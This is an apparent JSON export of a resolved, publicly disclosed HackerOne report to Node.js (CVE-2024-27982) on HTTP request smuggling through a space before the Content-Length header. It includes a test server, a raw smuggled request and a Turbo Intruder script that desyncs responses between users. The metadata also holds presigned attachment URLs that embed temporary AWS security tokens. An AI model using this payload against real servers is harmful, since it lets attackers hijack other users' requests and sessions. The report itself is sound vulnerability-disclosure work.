{
  "id": 2237099,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjM3MDk5",
  "url": "https://hackerone.com/reports/2237099",
  "title": "HTTP Request Smuggling via Content Length Obfuscation",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-11-02T16:41:53.250Z",
  "submitted_at": "2023-11-02T16:52:08.602Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bpingel",
    "url": "/bpingel",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2024-27982"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2024-05-03T14:55:56.399Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2024-04-03T14:55:46.962Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** The default web service in the most recent version of 18.X seems to have an issue with the interpretation of malformed headers. If a space is left before a content-length header then the header is not read correctly. This leaves the ability to smuggle in a second request as the body of the first.\n\n**Description:** HTTP request smuggling is present in applications running on the current version of the 18.X Node JS available for download from nodejs.org. When a space is placed before the content length header of a request it is not interpreted correctly and as a result the beginning of another request can be smuggled in the body. Formatted correctly it can consume portions of other user's requests or force them to access paths they did not intend to.\n\n## Steps To Reproduce:\n\nThis simple Node JS application was used for replication and showing of desync in identification parameters within requests.\n\n```\nconst http = require('http');\nconst port = 8082;\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/hello') {\n    console.log(JSON.stringify(req.headers));\n    console.log('%s', req.url);\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end('Hello, World!\\n');\n  } else if (req.url === '/bye') {\n    console.log('%s', req.url)\n    console.log(JSON.stringify(req.headers));\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    const name = req.headers['x-name'] || 'World';\n    res.end(`Goodbye, ${name}!\\n`);\n  } else {\n    res.writeHead(404, { 'Content-Type': 'text/plain' });\n    res.end('Route not found\\n');\n  }\n});\n\nserver.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});\n```\nand the smuggled request would look like this\n```\nPOST /hello HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nUpgrade-Insecure-Requests: 1\n Content-length: 43\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\nGET /bye HTTP/1.1\nx-name: Bob%s\nX-YzBqv: \n```\nWith `x-name` header being the header used to have an ID present in the request be reflected in the response.\n\n\n  1. Start up an application using the current version of Node JS 18, sample application above provided.\n  2. This testing was done using the Turbo Intruder with the following script to simulate both an attacker poisoning the web socket as well as a legitimate user sending a request to the web service.\n\n```\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=5,\n                           requestsPerConnection=100,\n                           pipeline=False,\n                           engine=Engine.THREADED\n                           )\n\n    for word in range(1, 100):\n        if word % 2:\n            CleanReq = re.sub(r' Content-length: [0-9]+', 'Null-head: test%s', target.req)\n            CleanReq = re.sub(r'GET [^v]*v: ', '\\r\\n', CleanReq)\n            engine.queue(CleanReq, word)\n        engine.queue(target.req, word)\n\n\ndef handleResponse(req, interesting):\n    # currently available attributes are req.status, req.wordcount, req.length and req.response\n    table.add(req)\n```\n\n{F2823458}\n\n  3. During these requests to /hello you will begin to receive responses from the /bye url. The content-length header in regular request is swapped out with a test ID header to track which request ID is receiving which poisoned requests back. \n\n## Impact: Using this vulnerability we've already shown that a malicious user can affect the connections of regular users and in worst cases this can be used to steal session data from users as with the right formatting a request could be smuggled that can consume another users entire request, session data and all. As in this log you can see that the first line of a request is being consumed by a header, but this can be completed in other ways to consume more of a request.\n{F2823460}\n\n## Impact\n\nPotential full compromise of users sessions on any service running a vulnerable version.",
  "weakness": {
    "id": 86,
    "name": "HTTP Request Smuggling"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2823457,
      "file_name": "Bob_Desync.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/51e5zbl3w5gxfkahbtznaybi47gx?response-content-disposition=attachment%3B%20filename%3D%22Bob_Desync.png%22%3B%20filename%2A%3DUTF-8%27%27Bob_Desync.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKB2FQVG%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T190209Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJIMEYCIQD7MAK8tbcUewbApwJe3CJ6yN7fT9PV3MY4F9JXNU1K5AIhAK7ASYtwmIBZ60ySZI3bSJzYTbIU3OrzA0fJLPV8aoyoKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwUsPDJHp3H0KpDoqcqjwWbVKzMpetPCLAbcRQLGtHLwDevjWPYj0SAWzAsfXULr6ggeLDwpEN5gtdbXTiumxqkcord59Xwt5y1b4hc5sx%2Fo9T1tXwZRk2LD6qLUxCs3vkYjnm9Xhn3YUs2O48L8my3T4GbV9sQOl9qXfy99jO6TUCjN6%2Fo9kf6LAGkW2H7BO%2FLWluI8cyAppBEj%2B%2FK%2BXyffAhvNFvrFuKs%2F0jPi6qZCeRTsaGnhB3%2FH29VMlUJWPDToNkVg%2FWQ2lLSIEjo5WHhxG9EJ49F%2FIvpfUOUR%2BDgXNEyVYGTvcumnVKhWckIQHMqewt19CYvjr%2BH3UGNvu8%2FDWxrKI8wweEVPmtCiVN0%2FWIekTqf2vAviO70QHjiZAwshlkqq4qrFkenaWkjvqAZGZhybQ53MVqqceC0bWdjZAcGfnaGBKKDAcye9wC94mLcY2AlHVtsoA2LR7wJ%2BUcZQysXVikJ58vTniOcJFGfqFhaC2bJGvhX%2F22RSW40Jd%2FzcmYrD1sAVkP8FTH3ysPc6N15m0iBboRZ0i2g3edxAzN9GS2UvF2NX2aDqM864RH1vvs%2BZbSylsqLn2GW%2BWD1LjEObBQV%2F8PVhhgT8zKOOBnDUwXnYJb8DZ9SbnHkvUqsKL4GjFgyehcUCJ3LRYnCpoN%2FzXwAK8Fkns3uBOUtq0FetkG9K8mk7GBPg%2Fu3SSQAu6hAj0ZJxpqsaKipVM%2FO8Dax4NzXtgjYvaE84XZLP05WkGyFIIQI9DZcRxwrWko7FOs7qalJsmNGzxAt22RowFPrX9PmfT93eVxaECfiqzrv%2BywekNX57eI7ZZx8249coRA%2BaS4Tk67SK%2BYLAQCJOu2D%2Fz%2ByJ8Bf1T8BDUC3ASTaFqFRX0LxRjdj9NrWMM%2B%2Fu8YGOrABF%2FC8bMq8eP9v6YreMtbSLQExVZBQECAsI6C5J69iZ9LA8GIDwCSPnqTBLnLEtc42l%2FEquIlBiX9q9zivb2lmOb1gP0OyBQHlojjYz%2FLoLltcMQI8iT2E5skFjBBdACiEBqnCkCkK18ssiGwuuq6HBNLWpZVdVVDzziLoOi%2F93A24YKGa63MUsbh8vLBeINjls0ZaiOS%2B8nw1enqEz%2BL3euYvLg3NVDgvfA8ybv%2FC%2FE8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7781b99e1090b775759c40a1b2246c5a563ba0351ae6e8906d765c158dcac93e",
      "file_size": 92897,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 2823458,
      "file_name": "Cleaned_Request.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fryttxaeqcvd2xezombfp0xgn3vm?response-content-disposition=attachment%3B%20filename%3D%22Cleaned_Request.png%22%3B%20filename%2A%3DUTF-8%27%27Cleaned_Request.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKB2FQVG%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T190209Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJIMEYCIQD7MAK8tbcUewbApwJe3CJ6yN7fT9PV3MY4F9JXNU1K5AIhAK7ASYtwmIBZ60ySZI3bSJzYTbIU3OrzA0fJLPV8aoyoKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwUsPDJHp3H0KpDoqcqjwWbVKzMpetPCLAbcRQLGtHLwDevjWPYj0SAWzAsfXULr6ggeLDwpEN5gtdbXTiumxqkcord59Xwt5y1b4hc5sx%2Fo9T1tXwZRk2LD6qLUxCs3vkYjnm9Xhn3YUs2O48L8my3T4GbV9sQOl9qXfy99jO6TUCjN6%2Fo9kf6LAGkW2H7BO%2FLWluI8cyAppBEj%2B%2FK%2BXyffAhvNFvrFuKs%2F0jPi6qZCeRTsaGnhB3%2FH29VMlUJWPDToNkVg%2FWQ2lLSIEjo5WHhxG9EJ49F%2FIvpfUOUR%2BDgXNEyVYGTvcumnVKhWckIQHMqewt19CYvjr%2BH3UGNvu8%2FDWxrKI8wweEVPmtCiVN0%2FWIekTqf2vAviO70QHjiZAwshlkqq4qrFkenaWkjvqAZGZhybQ53MVqqceC0bWdjZAcGfnaGBKKDAcye9wC94mLcY2AlHVtsoA2LR7wJ%2BUcZQysXVikJ58vTniOcJFGfqFhaC2bJGvhX%2F22RSW40Jd%2FzcmYrD1sAVkP8FTH3ysPc6N15m0iBboRZ0i2g3edxAzN9GS2UvF2NX2aDqM864RH1vvs%2BZbSylsqLn2GW%2BWD1LjEObBQV%2F8PVhhgT8zKOOBnDUwXnYJb8DZ9SbnHkvUqsKL4GjFgyehcUCJ3LRYnCpoN%2FzXwAK8Fkns3uBOUtq0FetkG9K8mk7GBPg%2Fu3SSQAu6hAj0ZJxpqsaKipVM%2FO8Dax4NzXtgjYvaE84XZLP05WkGyFIIQI9DZcRxwrWko7FOs7qalJsmNGzxAt22RowFPrX9PmfT93eVxaECfiqzrv%2BywekNX57eI7ZZx8249coRA%2BaS4Tk67SK%2BYLAQCJOu2D%2Fz%2ByJ8Bf1T8BDUC3ASTaFqFRX0LxRjdj9NrWMM%2B%2Fu8YGOrABF%2FC8bMq8eP9v6YreMtbSLQExVZBQECAsI6C5J69iZ9LA8GIDwCSPnqTBLnLEtc42l%2FEquIlBiX9q9zivb2lmOb1gP0OyBQHlojjYz%2FLoLltcMQI8iT2E5skFjBBdACiEBqnCkCkK18ssiGwuuq6HBNLWpZVdVVDzziLoOi%2F93A24YKGa63MUsbh8vLBeINjls0ZaiOS%2B8nw1enqEz%2BL3euYvLg3NVDgvfA8ybv%2FC%2FE8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=236554cc2d35f4e0eaa62d16a77e42e8c198a48835a4e4469d3adfc3a01a7e61",
      "file_size": 82924,
      "type": "image/png",
      "moderated": false
    },
    {
      "id": 2823460,
      "file_name": "Header_Consumption.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kbra97r6tzk7bc0czf7g72rwqtto?response-content-disposition=attachment%3B%20filename%3D%22Header_Consumption.png%22%3B%20filename%2A%3DUTF-8%27%27Header_Consumption.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSKB2FQVG%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T190209Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHkaCXVzLXdlc3QtMiJIMEYCIQD7MAK8tbcUewbApwJe3CJ6yN7fT9PV3MY4F9JXNU1K5AIhAK7ASYtwmIBZ60ySZI3bSJzYTbIU3OrzA0fJLPV8aoyoKrsFCPL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgwUsPDJHp3H0KpDoqcqjwWbVKzMpetPCLAbcRQLGtHLwDevjWPYj0SAWzAsfXULr6ggeLDwpEN5gtdbXTiumxqkcord59Xwt5y1b4hc5sx%2Fo9T1tXwZRk2LD6qLUxCs3vkYjnm9Xhn3YUs2O48L8my3T4GbV9sQOl9qXfy99jO6TUCjN6%2Fo9kf6LAGkW2H7BO%2FLWluI8cyAppBEj%2B%2FK%2BXyffAhvNFvrFuKs%2F0jPi6qZCeRTsaGnhB3%2FH29VMlUJWPDToNkVg%2FWQ2lLSIEjo5WHhxG9EJ49F%2FIvpfUOUR%2BDgXNEyVYGTvcumnVKhWckIQHMqewt19CYvjr%2BH3UGNvu8%2FDWxrKI8wweEVPmtCiVN0%2FWIekTqf2vAviO70QHjiZAwshlkqq4qrFkenaWkjvqAZGZhybQ53MVqqceC0bWdjZAcGfnaGBKKDAcye9wC94mLcY2AlHVtsoA2LR7wJ%2BUcZQysXVikJ58vTniOcJFGfqFhaC2bJGvhX%2F22RSW40Jd%2FzcmYrD1sAVkP8FTH3ysPc6N15m0iBboRZ0i2g3edxAzN9GS2UvF2NX2aDqM864RH1vvs%2BZbSylsqLn2GW%2BWD1LjEObBQV%2F8PVhhgT8zKOOBnDUwXnYJb8DZ9SbnHkvUqsKL4GjFgyehcUCJ3LRYnCpoN%2FzXwAK8Fkns3uBOUtq0FetkG9K8mk7GBPg%2Fu3SSQAu6hAj0ZJxpqsaKipVM%2FO8Dax4NzXtgjYvaE84XZLP05WkGyFIIQI9DZcRxwrWko7FOs7qalJsmNGzxAt22RowFPrX9PmfT93eVxaECfiqzrv%2BywekNX57eI7ZZx8249coRA%2BaS4Tk67SK%2BYLAQCJOu2D%2Fz%2ByJ8Bf1T8BDUC3ASTaFqFRX0LxRjdj9NrWMM%2B%2Fu8YGOrABF%2FC8bMq8eP9v6YreMtbSLQExVZBQECAsI6C5J69iZ9LA8GIDwCSPnqTBLnLEtc42l%2FEquIlBiX9q9zivb2lmOb1gP0OyBQHlojjYz%2FLoLltcMQI8iT2E5skFjBBdACiEBqnCkCkK18ssiGwuuq6HBNLWpZVdVVDzziLoOi%2F93A24YKGa63MUsbh8vLBeINjls0ZaiOS%2B8nw1enqEz%2BL3euYvLg3NVDgvfA8ybv%2FC%2FE8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a58feb5b3963b1cfbf28dad1206cb052c98ffbd94ca32ce2c99f6950a6aa2ef0",
      "file_size": 22090,
      "type": "image/png",
      "moderated": false
    }
  ],
  "allow_singular_disclosure_at": "2024-05-03T14:55:47.084Z",
  "allow_singular_disclosure_after": -43646782.58132376,
  "singular_disclosure_allowed": true,
  "vote_count": 17,
  "voters": [
    "itsmatinx",
    "zy9ard3",
    "s_p_q_r",
    "vladko312",
    "diabloesexufi",
    "soohongkim123",
    "m45hrur",
    "linkinpark76",
    "bpingel",
    "mitternachtskreatur4n4",
    "and 7 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "low"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 425552,
      "category": "team",
      "content": "The team has identified a critical vulnerability in the http server of the most recent version of Node, where malformed headers can lead to HTTP request smuggling. Specifically, if a space is placed before a content-length header, it is not interpreted correctly, enabling attackers to smuggle in a second request within the body of the first.",
      "updated_at": "2024-04-01T13:22:32.745Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 3044479,
        "username": "satanacchio",
        "name": "Marco Ippolito",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "https://marcoippolito.dev",
        "location": "",
        "created_at": "2024-01-08T12:53:21.534Z",
        "url": "https://hackerone.com/satanacchio",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/0xahh3gpvpqstk40lp23h0iqsnye/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
          "medium": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTQ4ODA5MywicHVyIjoiYmxvYl9pZCJ9fQ==--c2a6016f3346c8cd37b82ab87fa9f1dde77e4ddd/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwiZ3Jhdml0eSI6IkNlbnRlciIsInJlc2l6ZSI6IjgyeDgyXiIsImNyb3AiOiI4Mng4MiswKzAifSwicHVyIjoidmFyaWF0aW9uIn19--1329a0134ddd3a84f023c3c0400ac1ffe2f83a35/small.jpeg",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NTQ4ODA5MywicHVyIjoiYmxvYl9pZCJ9fQ==--c2a6016f3346c8cd37b82ab87fa9f1dde77e4ddd/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--cea846659d6dfdc215f3c0fb14f7ed8ebc9f95ef/small.jpeg"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
